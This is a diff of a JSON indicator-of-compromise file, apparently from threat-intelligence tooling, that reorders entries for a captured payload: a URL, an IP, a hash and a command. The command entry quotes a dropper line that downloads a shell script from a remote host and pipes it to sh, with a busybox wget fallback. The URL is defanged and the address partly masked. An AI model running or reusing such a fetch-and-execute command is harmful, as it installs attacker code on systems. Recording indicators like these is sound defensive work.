@@ -1,5 +1,11 @@
 [
   {
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxp://91.92.40.XXX/wget.sh"
+  },
+  {
     "context": "Embedded IP in inbound payload",
     "source": "static_analysis",
     "type": "ip",
@@ -12,22 +18,16 @@
     "value": "91.92.40.XXX"
   },
   {
-    "context": "Embedded URL in inbound payload",
+    "context": "Suspicious command in inbound payload",
     "source": "strings",
-    "type": "url",
-    "value": "hxxp://91.92.40.XXX/wget.sh"
+    "type": "command",
+    "value": "cmd=`cd /tmp;wget hxxp://91.92.40.XXX/wget.sh -O-|sh -s zyxrh;busybox wget hxxp://91.92.40.XXX/wget.sh -O-|sh -s zyxrh;c"
   },
   {
     "context": "Inbound payload hash (unknown)",
     "source": "static_analysis",
     "type": "hash",
     "value": "d5b47b0187db62a7f17f3a74d8639b5b525ba6822198e2fe863c403e3a8a061e"
-  },
-  {
-    "context": "Suspicious command in inbound payload",
-    "source": "strings",
-    "type": "command",
-    "value": "cmd=`cd /tmp;wget hxxp://91.92.40.XXX/wget.sh -O-|sh -s zyxrh;busybox wget hxxp://91.92.40.XXX/wget.sh -O-|sh -s zyxrh;c"
   },
   {
     "asn": "TechTies Inc.",
